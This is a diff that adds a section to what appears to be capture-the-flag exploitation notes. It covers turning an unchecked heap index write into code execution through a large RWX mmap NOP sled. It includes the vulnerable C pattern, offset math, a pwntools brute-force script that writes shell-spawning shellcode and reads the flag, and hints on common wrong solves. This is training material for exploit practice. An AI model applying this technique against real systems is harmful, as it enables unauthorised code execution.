@@ -84,3 +84,64 @@ p/x &target      # target address (GOT entry, RSP, etc.)
 x/20gx &arr      # view array contents
 watch *(long long*)target  # break when target changes
 ```
+
+## Heap OOB To Huge RWX `mmap`
+
+Pattern:
+
+```c
+shellcode = mmap(NULL, 0x1000000, PROT_READ|PROT_WRITE|PROT_EXEC,
+                 MAP_ANON|MAP_PRIVATE, -1, 0);
+memset(shellcode, 0x90, 0x1000000);
+
+struct dynarr {
+    unsigned int len;
+    unsigned int cap;
+    unsigned long long data[];
+};
+
+vec = calloc(sizeof(struct dynarr) + 0x10 * 8, 1);
+vec->data[idx] = value;   // no bounds check
+((void(*)())shellcode)();
+```
+
+Exploit idea:
+
+```text
+1. Use the unchecked index as a qword write relative to vec->data.
+2. Target the huge RWX mmap region, which is already a NOP sled.
+3. Write shellcode qwords somewhere inside the mapped region.
+4. Trigger call to shellcode base; execution slides through NOPs into shellcode.
+```
+
+Index math:
+
+```python
+idx = (shellcode_addr + offset - vec_data_addr) // 8
+```
+
+If there is no leak, the exact distance can be ASLR-dependent. Brute-force by attempts:
+
+```python
+sc = asm(shellcraft.sh())
+
+def write_qwords(base_idx):
+    for off in range(0, len(sc), 8):
+        chunk = sc[off:off+8].ljust(8, b"\x90")
+        edit(base_idx + off // 8, u64(chunk))
+
+for base_idx in candidate_indices:
+    io = start()
+    add(0)                 # make sure vec exists
+    write_qwords(base_idx)
+    call_shellcode()
+    io.sendline(b"id; cat flag*")
+```
+
+Red flags in wrong solves:
+
+```text
+Hardcoded heap/mmap offsets without a leak are usually not portable.
+Writing only one qword is not enough unless it is a complete useful stub.
+Check loop ranges; range(high, low) with default positive step is empty.
+```
